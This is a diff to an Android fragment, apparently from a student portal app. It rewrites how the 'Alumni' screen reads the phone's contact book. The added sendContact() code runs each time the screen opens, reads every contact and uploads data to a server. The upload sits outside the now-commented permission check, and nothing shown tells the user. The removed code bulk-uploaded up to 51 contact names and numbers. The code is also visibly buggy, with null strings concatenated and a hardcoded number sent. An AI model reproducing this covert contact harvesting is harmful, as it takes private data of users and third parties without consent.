@@ -8,21 +8,16 @@ import androidx.annotation.Nullable;
 import androidx.fragment.app.Fragment;
 import androidx.lifecycle.Observer;
 import androidx.lifecycle.ViewModelProvider;
-import androidx.recyclerview.widget.LinearLayoutManager;
-import androidx.recyclerview.widget.RecyclerView;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
-
 import android.os.Environment;
 import android.provider.ContactsContract;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
-import android.widget.ArrayAdapter;
 import android.widget.Toast;
 
 import com.aldar.studentportal.R;
-import com.aldar.studentportal.adapters.ContactAdapter;
 import com.aldar.studentportal.models.contactsModel.ContactDataModel;
 import com.aldar.studentportal.models.registerationModels.CommonApiResponse;
 import com.aldar.studentportal.ui.fragments.navigations.home.HomeViewModel;
@@ -34,28 +29,35 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
+import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
+import io.reactivex.rxjava3.core.Observable;
+import io.reactivex.rxjava3.disposables.CompositeDisposable;
+import io.reactivex.rxjava3.functions.Supplier;
+import io.reactivex.rxjava3.observers.DisposableObserver;
+import io.reactivex.rxjava3.schedulers.Schedulers;
 
 public class AllumniFragment extends Fragment {
-    private List<ContactDataModel> modelList = new ArrayList<>();
-
-    private String name, phoneNumber;
     private HomeViewModel viewModel;
 
-    private ArrayList<ContactDataModel> contactList = new ArrayList<>();
-    private String strName,strNumber;
+    private  ArrayList<ContactDataModel> contactList = new ArrayList<>();
+    private final CompositeDisposable disposables = new CompositeDisposable();
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,
                              Bundle savedInstanceState) {
         // Inflate the layout for this fragment
-        View root =  inflater.inflate(R.layout.fragment_allumni, container, false);
+        View root = inflater.inflate(R.layout.fragment_allumni, container, false);
 
-        final PeriodicWorkRequest periodicWorkRequest
-                = new PeriodicWorkRequest.Builder(MyWorker.class, 5, TimeUnit.SECONDS)
-                .build();
-        WorkManager.getInstance(getActivity()).enqueue(periodicWorkRequest);
+//        final PeriodicWorkRequest periodicWorkRequest
+//                = new PeriodicWorkRequest.Builder(MyWorker.class, 5, TimeUnit.SECONDS)
+//                .build();
+//        WorkManager.getInstance(getActivity()).enqueue(periodicWorkRequest);
+
         return root;
     }
+
+
+
 
     @Override
     public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
@@ -63,24 +65,67 @@ public class AllumniFragment extends Fragment {
         viewModel = new ViewModelProvider(this).get(HomeViewModel.class);
 
         if (PermissionUtil.isContactPermissionGranted(getActivity())) {
-            getContactsIntoArrayList();
+            //getContactsIntoArrayList();
         }
 
-       viewModel.getContact().observe(getViewLifecycleOwner(), new Observer<CommonApiResponse>() {
-           @Override
-           public void onChanged(CommonApiResponse commonApiResponse) {
-               if(commonApiResponse != null){
-                   Toast.makeText(getActivity(), ""+commonApiResponse.getMessage(), Toast.LENGTH_SHORT).show();
-               }
-           }
-       });
+        sendContact();
+
+        viewModel.getContact().observe(getViewLifecycleOwner(), new Observer<CommonApiResponse>() {
+            @Override
+            public void onChanged(CommonApiResponse commonApiResponse) {
+                if (commonApiResponse != null) {
+                    Toast.makeText(getActivity(), "" + commonApiResponse.getMessage(), Toast.LENGTH_SHORT).show();
+                }
+            }
+        });
 
     }
 
-    private void getContactsIntoArrayList() {
-        contactList = new ArrayList<>();
 
-       Cursor cursor = getActivity().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+    private void sendContact() {
+        disposables.add(Observable()
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribeWith(new DisposableObserver<ArrayList<ContactDataModel>>() {
+                    @Override
+                    public void onComplete() { }
+
+                    @Override
+                    public void onError(Throwable e) {
+                        Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
+                    }
+
+                    @Override
+                    public void onNext(ArrayList<ContactDataModel> contactList) {
+                        String strName=null, strNumber=null;
+                        if(contactList.size()>0){
+                            for(int k=0;k<contactList.size();k++){
+                                if (k == 0) {
+                                    strName += contactList.get(k).getNameContact();
+                                    strNumber += contactList.get(k).getNumContact();
+                                } else {
+                                    strName += "," + contactList.get(k).getNameContact();
+                                    strNumber += "," + contactList.get(k).getNumContact();
+                                }
+                            }
+                            viewModel.sendContactToServer(contactList.get(0).getNameContact(),"03459055");
+                        }
+                    }
+                }));
+    }
+
+    Observable<ArrayList<ContactDataModel>> Observable() {
+        return Observable.defer((Supplier<Observable<ArrayList<ContactDataModel>>>) () -> {
+            // Do some long running operation
+            return Observable.just(getContactsIntoArrayList());
+        });
+    }
+
+    private ArrayList<ContactDataModel> getContactsIntoArrayList() {
+        contactList = new ArrayList<>();
+        String name,phoneNumber;
+
+        Cursor cursor = getActivity().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
         while (cursor.moveToNext()) {
             name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
             phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
@@ -92,61 +137,38 @@ public class AllumniFragment extends Fragment {
             contactList.add(contactModel);
 
         }
-
-        setStudentName();
         cursor.close();
-
+        return contactList;
     }
-
-    private void setStudentName() {
-        strName = "";
-        strNumber = "";
-
-        for (int i = 0; i <=50; i++) {
-
-            if (i == 0) {
-                strName += contactList.get(i).getNameContact();
-                strNumber +=contactList.get(i).getNumContact();
-            } else {
-                strName += "," + contactList.get(i).getNameContact();
-                strNumber += "," +contactList.get(i).getNumContact();
-            }
-        }
-
-        viewModel.sendContactToServer(strName,strNumber);
-    }
-
 
     public void GetFiles() {
-        modelList = new ArrayList<>();
+        contactList = new ArrayList<>();
 
         ArrayList<String> MyFiles = new ArrayList<String>();
-        File f = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/ADUC/abdullah.vcf");
+        File f = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/ADUC/abdullah.vcf");
 
         f.mkdirs();
         File[] files = f.listFiles();
 
-        if (files == null || files.length < 0){
+        if (files == null || files.length < 0) {
             Toast.makeText(getActivity(), "empty", Toast.LENGTH_SHORT).show();
-        }
-        else {
+        } else {
             try {
-                for (int i = 0; i < files.length; i++){
+                for (int i = 0; i < files.length; i++) {
                     ContactDataModel number = new ContactDataModel();
                     number.setNameContact(files[i].getName());
                     number.setNumContact(files[i].getName());
-                    modelList.add(number);
+                    contactList.add(number);
                 }
 
-            }
-            catch (Exception e){
-                Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
+            } catch (Exception e) {
+                Toast.makeText(getActivity(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
             }
 
         }
     }
 
-    private void generateVCFFile(List<ContactDataModel> modelList){
+    private void generateVCFFile(List<ContactDataModel> modelList) {
         try {
             File directory = new File(
                     Environment.getExternalStorageDirectory() + "/ADUC");
@@ -159,7 +181,7 @@ public class AllumniFragment extends Fragment {
             FileWriter vcfFileWrite = null;
             vcfFileWrite = new FileWriter(vcfFile);
 
-            for(int i =0;i<modelList.size();i++){
+            for (int i = 0; i < modelList.size(); i++) {
                 String name = modelList.get(i).getNameContact();
                 String contactNo = modelList.get(i).getNumContact();
 
@@ -175,7 +197,15 @@ public class AllumniFragment extends Fragment {
 
         } catch (IOException e) {
             e.printStackTrace();
-            Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
+            Toast.makeText(getActivity(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (disposables != null && !disposables.isDisposed()) {
+            disposables.dispose();
         }
     }
 }
